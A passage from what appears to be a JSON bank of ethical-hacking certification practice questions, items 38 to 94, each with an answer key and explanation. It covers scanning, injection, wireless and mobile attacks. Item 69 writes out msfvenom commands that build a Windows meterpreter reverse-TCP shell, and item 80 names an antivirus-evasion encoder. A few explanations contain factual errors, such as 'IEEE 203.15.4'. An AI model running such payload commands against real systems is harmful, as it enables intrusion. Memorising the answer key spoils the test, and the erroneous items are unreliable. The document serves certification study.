      "explanation": "Actions on Objective: Once the attacker/intruder gains persistent access, they finally take action to fulfill their purposes, such as encryption for ransom, data exfiltration, or even data destruction."
    },
    {
      "q": 38,
      "type": "MCQ",
      "question": "Your friend installed the application from a third-party app store. After a while, some of the applications in his smartphone were replaced by malicious applications that appeared legitimate, and he began to receive a lot of advertising spam. Which of the following attacks has your friend been subjected to?",
      "options": [
        "Clickjacking",
        "SMS phishing attack",
        "SIM card attack",
        "Agent Smith attack"
      ],
      "correct": "D",
      "explanation": "Agent Smith is a modular malware that exploits Android vulnerabilities to replace legitimate existing apps with a malicious imitation. The malicious app displays a huge number of adverts or steals credit to pay for adverts."
    },
    {
      "q": 39,
      "type": "MCQ",
      "question": "Identify the attack used in the scenario below: The victim connected his iPhone to a public computer that the attacker had previously infected. After establishing the connection with this computer, the victim enabled iTunes Wi-Fi sync so that the device could continue communication with that computer even after being physically disconnected. Now the attacker who infected the computer can access the victim's iPhone and monitor all of the victim's activity on the iPhone, even after the device is out of the communication zone.",
      "options": [
        "iOS trustjacking",
        "Exploiting SS7 vulnerability",
        "Man-in-the-disk attack",
        "iOS jailbreaking"
      ],
      "correct": "A",
      "explanation": "iOS Trustjacking is a vulnerability that allows attackers to exploit the iTunes Wi-Fi sync feature. Once the victim trusts the malicious device and enables iTunes Wi-Fi Sync, the attacker gains persistent access over the same network or via VPN."
    },
    {
      "q": 40,
      "type": "MCQ",
      "question": "You must to identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. Which of the following nmap commands do you must use to perform the TCP SYN ping scan?",
      "options": [
        "nmap -sn -PS < target IP address >",
        "nmap -sn -PO < target IP address >",
        "nmap -sn -PP < target IP address >",
        "nmap -sn -PA < target IP address >"
      ],
      "correct": "A",
      "explanation": "TCP SYN Ping (-PS) sends an empty TCP packet with the SYN flag set. The default destination port is 80, but an alternate port can be specified. Either RST or SYN/ACK response tells Nmap that the host is available."
    },
    {
      "q": 41,
      "type": "MCQ",
      "question": "According to the configuration of the DHCP server, only the last 100 IP addresses are available for lease in subnet 10.1.4.0/23. Which of the following IP addresses is in the range of the last 100 addresses?",
      "options": [
        "10.1.4.254",
        "10.1.155.200",
        "10.1.3.156",
        "10.1.5.200"
      ],
      "correct": "D",
      "explanation": "The /23 subnet provides addresses from 10.1.4.1 to 10.1.5.254. The last 100 addresses include 10.1.5.200."
    },
    {
      "q": 42,
      "type": "MCQ",
      "question": "You have detected an abnormally large amount of traffic coming from local computers at night. You decide to find out the reason, do a few checks and find that an attacker has exfiltrated user data. Also, you noticed that AV tools could not find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs. Which of the following type of malware did the attacker use to bypass your company's application whitelisting?",
      "options": [
        "Phishing malware",
        "Logic bomb malware",
        "Fileless malware",
        "Zero-day malware"
      ],
      "correct": "C",
      "explanation": "Fileless malware is a type of malicious software that uses legitimate programs to infect a computer. It operates in memory and leaves no footprint, making it challenging to detect and remove."
    },
    {
      "q": 43,
      "type": "MCQ",
      "question": "Viktor, a professional hacker, targeted an organization's network to sniff all the traffic. During this process, Viktor plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Viktor in the above scenario?",
      "options": [
        "DNS poisoning attack",
        "ARP spoofing attack",
        "STP attack",
        "VLAN hopping attack"
      ],
      "correct": "C",
      "explanation": "An STP manipulation attack is when an attacker spoofs the root bridge in the topology by broadcasting out an STP configuration/topology change BPDU announcing that the attacker's system has a lower bridge priority."
    },
    {
      "q": 44,
      "type": "MCQ",
      "question": "Which of the following is an IOS jailbreaking technique that patches the kernel during the device boot to keep jailbroken after each reboot?",
      "options": [
        "Semi-tethered jailbreaking",
        "Semi-untethered jailbreaking",
        "Tethered jailbreaking",
        "Untethered jailbreaking"
      ],
      "correct": "D",
      "explanation": "An untethered jailbreak is a jailbreak that does not require any assistance when it reboots up. The kernel will be patched without the help of a computer or an application."
    },
    {
      "q": 45,
      "type": "MCQ",
      "question": "An ethical hacker has already received all the necessary information and is now considering further actions. For example, infect a system with malware and use phishing to gain credentials to a system or web application. What phase of ethical hacking methodology is the hacker currently in?",
      "options": [
        "Reconnaissance",
        "Maintaining access",
        "Scanning",
        "Gaining access"
      ],
      "correct": "D",
      "explanation": "Gaining Access: At this point, the hacker has the information needed and decides how to carry out the attack using techniques like phishing, brute force, spoofing, buffer overflow, session hijacking, etc."
    },
    {
      "q": 46,
      "type": "MCQ",
      "question": "You must choose a tool for monitoring your organization's website, analyzing the website's traffic, and tracking the geographical location of the users visiting the organization's website. Which of the following tools will you use for these purposes?",
      "options": [
        "WAFW00F",
        "WebSite-Watcher",
        "Webroot",
        "Web-Stat"
      ],
      "correct": "D",
      "explanation": "Web-Stat provides detailed visitor information including last visit, search engine, location, equipment, and more. It helps learn how people interact with your site."
    },
    {
      "q": 47,
      "type": "MCQ",
      "question": "Which of the following online tools allows attackers to gather information related to the model of the IoT device and the certifications granted to it?",
      "options": [
        "search.com",
        "Google image search",
        "FCC ID search",
        "EarthExplorer"
      ],
      "correct": "C",
      "explanation": "An FCC ID is a unique identifier assigned to a device registered with the United States Federal Communications Commission. By searching an FCC ID, you can find details on wireless operating frequency, photos, user manuals, and SAR reports."
    },
    {
      "q": 48,
      "type": "MCQ",
      "question": "You want to execute an SQLi attack. The first thing you check is testing the response time of a true or false response. Secondly, you want to use another command to determine whether the database will return true or false results for user IDs. Which two SQL injection types have you tried to perform?",
      "options": [
        "Union-based and error-based",
        "Out of band and boolean-based",
        "Time-based and union-based",
        "Time-based and boolean-based"
      ],
      "correct": "D",
      "explanation": "Time-based SQL Injection relies on sending an SQL query that forces the database to wait for a specified amount of time. Boolean-based SQL Injection relies on sending an SQL query that forces the application to return a different result depending on whether the query returns TRUE or FALSE."
    },
    {
      "q": 49,
      "type": "MCQ",
      "question": "Identify the Bluetooth hacking technique, which refers to the theft of information from a wireless device through Bluetooth?",
      "options": [
        "Bluesnarfing",
        "Bluesmacking",
        "Bluebugging",
        "Bluejacking"
      ],
      "correct": "A",
      "explanation": "Bluesnarfing is the unauthorized access of information from a wireless device through a Bluetooth connection. This allows access to calendars, contact lists, emails and text messages, and on some phones, pictures and private videos."
    },
    {
      "q": 50,
      "type": "MCQ",
      "question": "Which of the following keys can you share using asymmetric cryptography?",
      "options": [
        "User passwords",
        "Private keys",
        "Public keys",
        "Public and private keys"
      ],
      "correct": "C",
      "explanation": "Public-key cryptography uses pairs of keys: public keys (which may be known to others), and private keys (which may never be known by any except the owner). The public key can be openly distributed without compromising security."
    },
    {
      "q": 51,
      "type": "MCQ",
      "question": "Which of the following commands verify a user ID on an SMTP server?",
      "options": [
        "NOOP",
        "VRFY",
        "EXPN",
        "RCPT"
      ],
      "correct": "B",
      "explanation": "VRFY - This SMTP command is used to verify a user ID on a mail domain. It can be used to test for valid user IDs."
    },
    {
      "q": 52,
      "type": "MCQ",
      "question": "Your organization uses LDAP for accessing distributed directory services. An attacker knowing this can try to take advantage of an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on your organization. Which of the following tools can an attacker use to gather information from the LDAP service?",
      "options": [
        "Zabasearch",
        "ike-scan",
        "EarthExplorer",
        "JXplorer"
      ],
      "correct": "D",
      "explanation": "JXplorer is a free general purpose LDAP browser that can be used to read and search any LDAP directory. It allows querying via LDAP to enumerate information with GUI."
    },
    {
      "q": 53,
      "type": "MCQ",
      "question": "You need to assess the system used by your employee. During the assessment, you found that compromise was possible through user directories, registries, and other system parameters. Also, you discovered vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software configuration errors. Which of the following types of vulnerability assessments that you conducted?",
      "options": [
        "Host-based assessment",
        "Credentialed assessment",
        "Distributed assessment",
        "Database assessment"
      ],
      "correct": "A",
      "explanation": "Host-based assessments are a type of security check that involve conducting a configuration-level check to identify system configurations, user directories, file systems, registry settings, and other parameters to evaluate the possibility of compromise."
    },
    {
      "q": 54,
      "type": "MCQ",
      "question": "Ivan, the evil hacker, decided to attack the cloud services of the target organization. First of all, he decided to infiltrate the target's MSP provider by sending phishing emails that distributed specially created malware. This program compromised users' credentials, and Ivan managed to gain remote access to the cloud service. Further, he accessed the target customer profiles with his MSP account, compressed the customer data, and stored them in the MSP. After this, he used this information to launch further attacks on the target organization. Which of the following cloud attacks did Ivan perform?",
      "options": [
        "Cloud hopper attack",
        "Cloudborne attack",
        "Man-in-the-cloud (MITC) attack",
        "Cloud cryptojacking"
      ],
      "correct": "A",
      "explanation": "Cloud Hopper (Operation Cloud Hopper) was an extensive attack directed at MSPs. The group used MSP's as intermediaries to acquire assets and trade secrets from MSP-client organizations by compromising the MSP first."
    },
    {
      "q": 55,
      "type": "MCQ",
      "question": "The attacker wants to attack the target organization's Internet-facing web server. In case of a successful attack, he will also get access to back-end servers protected by a firewall. The attacker plans to use URL https://mainurl.com/feed.php?url=externalsite.com/feed/to to obtain a remote feed and alter the URL to the localhost to view all the local resources on the target server. Which of the following types of attacks is the attacker planning to perform?",
      "options": [
        "Website defacement.",
        "Web server misconfiguration.",
        "Web cache poisoning attack.",
        "Server-side request forgery attack."
      ],
      "correct": "D",
      "explanation": "In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources by supplying or modifying a URL which the code running on the server will read or submit data to."
    },
    {
      "q": 56,
      "type": "MCQ",
      "question": "Identify the technique by description: The attacker wants to create a botnet. Firstly, he collects information about a large number of vulnerable machines to create a list. Secondly, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures a very fast spreading and installation of malicious code.",
      "options": [
        "Topological scanning technique",
        "Permutation scanning technique",
        "Hit-list scanning technique",
        "Subnet scanning technique"
      ],
      "correct": "C",
      "explanation": "Hit-list scanning involves composing a list of vulnerable hosts in advance and sending it along with the worm. The list is divided among worm instances so that duplicate infection attempts are avoided while maintaining redundancy."
    },
    {
      "q": 57,
      "type": "MCQ",
      "question": "You come to a party with friends and ask the apartment owner about access to his wireless network. It tells you the name of the wireless point and its password, but when you try to connect to it, the connection occurs without asking for a password. Which of the following attacks could have occurred?",
      "options": [
        "Evil twin attack",
        "Piggybacking attack",
        "Wireless sniffing",
        "Wardriving attack"
      ],
      "correct": "A",
      "explanation": "An evil twin attack is when a hacker sets up a fake Wi-Fi network that looks like a legitimate access point. The attackers set up a fake network with the same or similar name to trick victims into connecting to it instead of the legitimate network."
    },
    {
      "q": 58,
      "type": "MCQ",
      "question": "Identify wireless security protocol by description: This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as 256-bit Galois/Counter Mode Protocol (GCMP-256), 84-bit Hashed Message Authentication Mode with Secure Hash Algorithm (HMAC-SHA384), and Elliptic Curve Digital Signature Algorithm (ECDSA) using a 384-bit elliptic curve.",
      "options": [
        "WPA3-Personal",
        "WPA2-Personal",
        "WPA3-Enterprise",
        "WPA2-Enterprise"
      ],
      "correct": "C",
      "explanation": "WPA3-Enterprise uses an equivalent 192-bit cryptographic strength (AES-256 in GCM mode with SHA-384 as HMAC), providing higher security than WPA3-Personal which uses CCMP-128 (AES-128 in CCM mode)."
    },
    {
      "q": 59,
      "type": "MCQ",
      "question": "You know that an attacker can create websites similar to legitimate sites in pharming and phishing attacks. Which of the following is the difference between them?",
      "options": [
        "Both pharming and phishing attacks are identical.",
        "Pharming attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name. Phishing attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities.",
        "Both pharming and phishing attacks are purely technical.",
        "Phishing attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name. Pharming attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities."
      ],
      "correct": "D",
      "explanation": "Phishing uses spoofed websites and social engineering (fake links). Pharming compromises the DNS server level to redirect users to fake websites even when they input the correct web address."
    },
    {
      "q": 60,
      "type": "MCQ",
      "question": "To bypass firewalls using the DNS tunnelling method to exfiltrate data, you can use the NSTX tool. On which of the following ports should be run the NSTX tool?",
      "options": [
        "53",
        "23",
        "80",
        "50"
      ],
      "correct": "A",
      "explanation": "DNS uses both UDP server port 53 and TCP server port 53 for communications. Typically UDP is used, but TCP will be used for zone transfers or with payloads over 512 bytes."
    },
    {
      "q": 61,
      "type": "MCQ",
      "question": "Which of the following vulnerabilities will you use if you know that the target network uses WPA3 encryption?",
      "options": [
        "Cross-site request forgery",
        "Dragonblood",
        "AP misconfiguration",
        "Key reinstallation attack"
      ],
      "correct": "B",
      "explanation": "Dragonblood vulnerabilities were disclosed in 2019 affecting WPA3. They allow an attacker in range of a password-protected Wi-Fi network to obtain the password. WPA3's SAE handshake (Dragonfly) is affected by password partitioning attacks."
    },
    {
      "q": 62,
      "type": "MCQ",
      "question": "During a port scan on the target host, your colleague sends FIN/ACK probes and finds that an RST packet is sent in response by the target host, indicating that the port is closed. Which of the following port scanning techniques did your colleague use?",
      "options": [
        "Xmas scan",
        "ACK flag probe scan",
        "TCP Maimon scan",
        "IDLE/IPID header scan"
      ],
      "correct": "C",
      "explanation": "The Maimon scan is exactly the same as NULL, FIN, and Xmas scan, except that the probe is FIN/ACK. According to RFC 793, a RST packet should be generated in response whether the port is open or closed."
    },
    {
      "q": 63,
      "type": "MCQ",
      "question": "During the scan, you found a serious vulnerability, compiled a report and sent it to your colleagues. In response, you received proof that they fixed this vulnerability a few days ago. How can you characterize this vulnerability?",
      "options": [
        "False-positive",
        "False-true",
        "True-false",
        "False-negative"
      ],
      "correct": "A",
      "explanation": "False positives are mislabeled security alerts, indicating there is a threat when in actuality, there isn't. In this case, the scanner detected a vulnerability that had already been fixed."
    },
    {
      "q": 64,
      "type": "MCQ",
      "question": "Which of the following rootkit types sits undetected in the core components of the operating system?",
      "options": [
        "Hypervisor rootkit",
        "Kernel rootkit",
        "Firmware rootkit",
        "Hardware rootkit"
      ],
      "correct": "B",
      "explanation": "Kernel-mode rootkits are implemented within an operating system's kernel module, where they can control all system processes. They are difficult to detect and can impact system stability."
    },
    {
      "q": 65,
      "type": "MCQ",
      "question": "Your organization has a public key infrastructure set up. Your colleague Bernard wants to send a message to Joan. Therefore, Bernard both encrypts the message and digitally signs it. Bernard uses ____ to encrypt the message for these purposes, and Joan uses ____ to confirm the digital signature.",
      "options": [
        "Joan's public key; Bernard's public key.",
        "Bernard's public key; Bernard's public key.",
        "Joan's public key; Joan's public key.",
        "Joan's private key; Bernard's public key."
      ],
      "correct": "A",
      "explanation": "When encrypting, you use recipient's public key to write a message. When signing, you use your private key to create the signature, and recipients use your public key to verify it."
    },
    {
      "q": 66,
      "type": "MCQ",
      "question": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 147 million people In September of 2017. At the same time fix was available from the software vendor for several months before the intrusion. In which of the following security processes has failed?",
      "options": [
        "Patch management",
        "Vendor risk management",
        "Security awareness training",
        "Secure development lifecycle"
      ],
      "correct": "A",
      "explanation": "Patch management is the process of distributing and applying updates to software. These patches are often necessary to correct errors (vulnerabilities or bugs) in the software. In this case, the patch was available but not applied."
    },
    {
      "q": 67,
      "type": "MCQ",
      "question": "Ivan, the evil hacker, decided to use Nmap scan open ports and running services on systems connected to the target organization's OT network. For his purposes, he enters the Nmap command into the terminal which identifies Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following commands did Ivan use in this scenario?",
      "options": [
        "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >",
        "nmap -Pn -sT -p 46824 < Target IP >",
        "nmap -Pn -sT -p 102 --script s7-info < Target IP >",
        "nmap -Pn -sU -p 44818 --script enip-info < Target IP >"
      ],
      "correct": "D",
      "explanation": "The enip-info NSE script sends an EtherNet/IP packet to devices on port 44818 (UDP) to gather information including Device Type, Vendor ID, Product name, Serial Number, Product code, and Device IP."
    },
    {
      "q": 68,
      "type": "MCQ",
      "question": "You need to transfer sensitive data of the organization between industrial systems securely. For these purposes, you have decided to use short-range wireless communication technology that meets the following requirements: Protocol based on the IEEE 203.15.4 standard; Range of 10-100 m; Designed for small-scale projects which need wireless connection. Which of the following protocols will meet your requirements?",
      "options": [
        "MQTT",
        "Zigbee",
        "LPWAN",
        "NB-IoT"
      ],
      "correct": "B",
      "explanation": "Zig-Bee is a short-range communication protocol based on the IEEE 203.15.4 standard. It is used in devices that transfer data infrequently at a low rate in a restricted area and within a range of 10-100 m."
    },
    {
      "q": 69,
      "type": "MCQ",
      "question": "Which of the following is a correct example of using msfvenom to generate a reverse TCP shellcode for Windows?",
      "options": [
        "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f c",
        "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f c",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe"
      ],
      "correct": "D",
      "explanation": "For reverse shells, LHOST should be the attacker's IP (where you want the connection back to), and LPORT is the port to connect back on. RHOST is used for bind shells."
    },
    {
      "q": 70,
      "type": "MCQ",
      "question": "A competitor organization has hired a professional hacker who could collect sensitive information about your organization. The hacker starts by gathering the server IP address of the target organization using Whois footprinting. After this, he entered the server IP address as an input to an online tool to retrieve information such as your organization's network range and identify the network topology and operating system used in the network. Which of the following tools did the hacker use for this purpose?",
      "options": [
        "Baidu",
        "AOL",
        "ARIN",
        "DuckDuckGo"
      ],
      "correct": "C",
      "explanation": "ARIN (American Registry for Internet Numbers) database provides information about IP address blocks, network ranges, and ISP allocations in North America."
    },
    {
      "q": 71,
      "type": "MCQ",
      "question": "Which of the following ports must you block first in case that you are suspicious that an IoT device has been compromised?",
      "options": [
        "8080",
        "22",
        "80",
        "48101"
      ],
      "correct": "D",
      "explanation": "Port 48101 was associated with the Mirai botnet. Infected devices attempt to spread malware by using port 48101 to send results to the threat actor. This was a key indicator in one of the largest DDoS attacks using IoT devices."
    },
    {
      "q": 72,
      "type": "MCQ",
      "question": "You performed a tool-based vulnerability assessment and found vulnerabilities. You have started to analyze these issues and found that they are not true vulnerabilities. How can you characterize these issues?",
      "options": [
        "True positives",
        "True negatives",
        "False positives",
        "False negatives"
      ],
      "correct": "C",
      "explanation": "False positives occur when a scanner flags a security vulnerability that you do not actually have. It's like a false alarm."
    },
    {
      "q": 73,
      "type": "MCQ",
      "question": "Antonio wants to infiltrate the target organization's network. To accomplish this task, he used a technique using which he encoded packets with Unicode characters. The target company's IDS cannot recognize the packets, but the target web server can decode them. Which of the following techniques did Antonio use to evade the IDS system?",
      "options": [
        "Obfuscating",
        "Urgency flag",
        "Session splicing",
        "Desynchronization"
      ],
      "correct": "A",
      "explanation": "Obfuscation involves concealing an attack with special characters, control characters, hex format, or Unicode representation to evade IDS detection while still being processed by the target server."
    },
    {
      "q": 74,
      "type": "MCQ",
      "question": "Your company follows the five-tier container technology architecture. Your colleagues use container technology to deploy applications/software. In this process, they include all dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. Now they verify and validate image contents, sign images, and send them to the registries. At which of the following tiers are your colleagues currently working according to the five-tier container technology architecture?",
      "options": [
        "Tier-2: Testing and accreditation systems.",
        "Tier-3: Registries.",
        "Tier-4: Orchestrators.",
        "Tier-1: Developer machines."
      ],
      "correct": "A",
      "explanation": "Tier-2: Testing and accreditation systems - verification and validation of image contents, signing images and sending them to the registries."
    },
    {
      "q": 75,
      "type": "MCQ",
      "question": "According to Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, which of the following ranges is the medium?",
      "options": [
        "4.0-6.9",
        "4.0-6.0",
        "3.0-6.9",
        "3.9-6.9"
      ],
      "correct": "A",
      "explanation": "CVSS v3.1 severity ratings: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0)."
    },
    {
      "q": 76,
      "type": "MCQ",
      "question": "Identify the exploit framework whose capabilities include automated attacks on services, ports, applications and unpatched security flaws?",
      "options": [
        "Maltego",
        "Wireshark",
        "Nessus",
        "Metasploit"
      ],
      "correct": "D",
      "explanation": "The Metasploit Framework is a tool for developing and executing exploit code against a remote target machine. It includes choosing exploits, configuring payloads, encoding techniques, and executing the exploit."
    },
    {
      "q": 77,
      "type": "MCQ",
      "question": "You were instructed to check the configuration of the webserver and you found that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. You understand that this vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information. Which of the following attacks can an attacker perform using this vulnerability?",
      "options": [
        "Padding oracle attack",
        "DUHK attack",
        "Side-channel attack",
        "DROWN attack"
      ],
      "correct": "D",
      "explanation": "The DROWN (Decrypting RSA with Obsolete and Weakened eNcryption) attack exploits servers supporting modern TLS by using their support for the obsolete SSLv2 protocol. If the same certificate is used on another SSLv2 server, the TLS server is vulnerable."
    },
    {
      "q": 78,
      "type": "MCQ",
      "question": "You simulate an attack on your organization's network resources and target the NetBIOS service. You decided to use the NetBIOS API for this attack and perform an enumeration. After finishing, you found that port 139 was open, and you could see the resources that could be accessed or viewed on a remote system. Also, you came across many NetBIOS codes during enumeration. Which of the following NetBIOS codes is used for obtaining the messenger service running for the logged-in user?",
      "options": [
        "<20>",
        "<00>",
        "<03>",
        "<1B>"
      ],
      "correct": "C",
      "explanation": "NetBIOS suffix <03> indicates the Windows Messenger service for the logged-in user. <00> is Workstation Service, <20> is File Service, <1B> is Domain Master Browser."
    },
    {
      "q": 79,
      "type": "MCQ",
      "question": "Your company has hired Jack, a cybersecurity specialist, to conduct another pentest. Jack immediately decided to get to work. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. As a result of these actions, a DDoS attack occurred, and legitimate employees could not access the company's network. Which of the following attacks did Jack perform?",
      "options": [
        "VLAN hopping",
        "Rogue DHCP server attack",
        "STP attack",
        "DHCP starvation"
      ],
      "correct": "D",
      "explanation": "In a DHCP Starvation attack, a hostile actor sends bogus DISCOVER packets until the DHCP server thinks it has expended its available pool. This denies service to legitimate clients."
    },
    {
      "q": 80,
      "type": "MCQ",
      "question": "Which of the following Metasploit Framework tool can be used to bypass antivirus?",
      "options": [
        "msfcli",
        "msfpayload",
        "msfd",
        "msfencode"
      ],
      "correct": "D",
      "explanation": "Msfencode is a tool that alters the code in an executable so that it looks different to antivirus software but will still run the same way. It encodes payloads to evade antivirus detection."
    },
    {
      "q": 81,
      "type": "MCQ",
      "question": "Identify the attack by description: The attacker decides to attack IoT devices. First, he will record the frequency required to share information between connected devices. Once he gets the necessary frequency, the attacker will capture the original data when the connected devices initiate commands. As soon as he collects original data, he will use tools such as URH to segregate the command sequence. The final step in this attack will be starting injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices.",
      "options": [
        "Replay attack.",
        "Side-channel attack.",
        "Reconnaissance attack.",
        "Cryptanalysis attack."
      ],
      "correct": "A",
      "explanation": "A replay attack occurs when a cybercriminal eavesdrops on a secure network communication, intercepts it, and then fraudulently delays or resends it. The attack could be successful simply by resending the whole captured communication."
    },
    {
      "q": 82,
      "type": "MCQ",
      "question": "Identify the attack by description: This attack is performed at layer 7 to take down web infrastructure. During its execution, partial HTTP requests are sent to the web infrastructure or applications and upon receiving a partial request, the target server opens multiple connections and keeps waiting for the requests to complete.",
      "options": [
        "Phlashing",
        "Session splicing",
        "Slowloris attack",
        "Desynchronization"
      ],
      "correct": "C",
      "explanation": "Slowloris tries to keep many connections to the target web server open and hold them open as long as possible by opening connections and sending partial requests, periodically sending subsequent HTTP headers but never completing the request."
    },
    {
      "q": 83,
      "type": "MCQ",
      "question": "You need to describe the principal characteristics of the vulnerability and make a numerical estimate reflecting its severity using CVSS v3.0 to properly assess and prioritize the organization's vulnerability management processes. As a result of the research, you received a basic score of 4.0 according to CVSS rating. What is the CVSS severity level of the vulnerability discovered?",
      "options": [
        "High",
        "Low",
        "Critical",
        "Medium"
      ],
      "correct": "D",
      "explanation": "CVSS v3.0 severity ratings: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0). A score of 4.0 is Medium."
    },
    {
      "q": 84,
      "type": "MCQ",
      "question": "Which of the following files determines the basic configuration in an Android application, such as broadcast receivers, services, etc.?",
      "options": [
        "resources.asrc",
        "APK.info",
        "classes.dex",
        "AndroidManifest.xml"
      ],
      "correct": "D",
      "explanation": "Every app project must have an AndroidManifest.xml file at the root of the project source set. It describes essential information about the app including package name, components (activities, services, broadcast receivers, content providers), permissions, and hardware/software features."
    },
    {
      "q": 85,
      "type": "MCQ",
      "question": "Which of the following AAA protocols can use for authentication users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network?",
      "options": [
        "TACACS",
        "Kerberos",
        "DIAMETER",
        "RADIUS"
      ],
      "correct": "D",
      "explanation": "RADIUS (Remote Authentication Dial-In User Service) is a networking protocol that provides centralized AAA management for users who connect and use a network service, including dialup, DSL, wireless, and VPN connections."
    },
    {
      "q": 86,
      "type": "MCQ",
      "question": "You found that sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. Which of the following protocols, which can send data using encryption and digital certificates, will help solve this problem?",
      "options": [
        "IP",
        "FTP",
        "HTTPS",
        "FTPS"
      ],
      "correct": "D",
      "explanation": "FTPS (FTP-SSL, FTP Secure) is an extension to FTP that adds support for TLS and SSL cryptographic protocols, including server-side public key authentication certificates and client-side authorization certificates."
    },
    {
      "q": 87,
      "type": "MCQ",
      "question": "John wants to attack the target organization, but before that, he needs to gather information. For these purposes, he performs DNS footprinting to gather information about DNS servers and identify the hosts connected to the target network. John is going to use an automated tool that can retrieve information about DNS zone data, including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. Which of the following tools will John use?",
      "options": [
        "Bluto",
        "zANTI",
        "Towelroot",
        "Knative"
      ],
      "correct": "A",
      "explanation": "Bluto is a Python-based tool for DNS recon, DNS zone transfer testing, DNS wild card checks, DNS brute-forcing, e-mail enumeration and more. It queries for MX and NS records, gathers subdomains, attempts zone transfers, and performs brute forcing."
    },
    {
      "q": 88,
      "type": "MCQ",
      "question": "Identify the protocol used to secure an LDAP service against anonymous queries?",
      "options": [
        "SSO",
        "NTLM",
        "RADIUS",
        "WPA"
      ],
      "correct": "B",
      "explanation": "LDAP is vulnerable to anonymous connections. Using NTLM or any basic authentication mechanism helps limit access to legitimate users and prevents anonymous queries."
    },
    {
      "q": 89,
      "type": "MCQ",
      "question": "You need to use information security controls that create an appealing isolated environment for hackers to prevent them from compromising critical targets while simultaneously gathering information about the hacker. Which of the following will you use for this purpose?",
      "options": [
        "Firewall",
        "Intrusion detection system",
        "Botnet",
        "Honeypot"
      ],
      "correct": "D",
      "explanation": "A honeypot is a network-attached system set up as a decoy to lure cyberattackers and detect, deflect and study hacking attempts. It looks like a real system but is designed to gather information about attackers."
    },
    {
      "q": 90,
      "type": "MCQ",
      "question": "Which of the following Nmap commands perform a stealth scan?",
      "options": [
        "nmap \u2013sS",
        "nmap -sU",
        "nmap -sT",
        "nmap -sM"
      ],
      "correct": "A",
      "explanation": "TCP SYN scan (-sS) is the default and most popular scan option. It is relatively unobtrusive and stealthy, since it never completes TCP connections. It's also called a stealth scan."
    },
    {
      "q": 91,
      "type": "MCQ",
      "question": "Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization's web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use?",
      "options": [
        "Pretexting",
        "Pharming",
        "Skimming",
        "Wardriving"
      ],
      "correct": "B",
      "explanation": "Pharming exploits how internet browsing works by modifying the DNS table in a server or the computer's hosts file to redirect traffic away from legitimate websites to fake ones. DNS cache poisoning is a pharming technique."
    },
    {
      "q": 92,
      "type": "MCQ",
      "question": "You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following: TCP/IP fingerprinting (for OS scan) requires root privileges. QUITTING! Why couldn't the scan be performed?",
      "options": [
        "The shell is not stabilized.",
        "OS Scan requires root privileges.",
        "The nmap syntax is wrong.",
        "The outgoing TCP/IP fingerprinting is blocked by the host firewall."
      ],
      "correct": "B",
      "explanation": "Using the -O flag to determine the OS requires root privileges. The error message explicitly states: TCP/IP fingerprinting (for OS scan) requires root privileges."
    },
    {
      "q": 93,
      "type": "MCQ",
      "question": "Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). Which of the following is this type of solution?",
      "options": [
        "Saas",
        "PaaS",
        "Caas",
        "Iaas"
      ],
      "correct": "A",
      "explanation": "SaaS (Software as a Service) applications move the infrastructure, platform, and all support for the application and its data to a third-party hosting provider. This eliminates the need for IT staff to manage network, infrastructure, hardware, software, OS, backups, and security."
    },
    {
      "q": 94,
      "type": "MCQ",
      "question": "Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity?",
      "options": [
        "Spoof source address scanning",
        "Decoy scanning",
        "Idle scanning",
        "Packet fragmentation scanning"
      ],
      "correct": "C",
      "explanation": "Idle scan is a TCP port scan method that uses spoofed packets impersonating another computer (zombie) whose network traffic is very slow or nonexistent. It allows scanning a target network while forging your identity."
    },
    {
      "q": 95,
      "type": "MCQ",
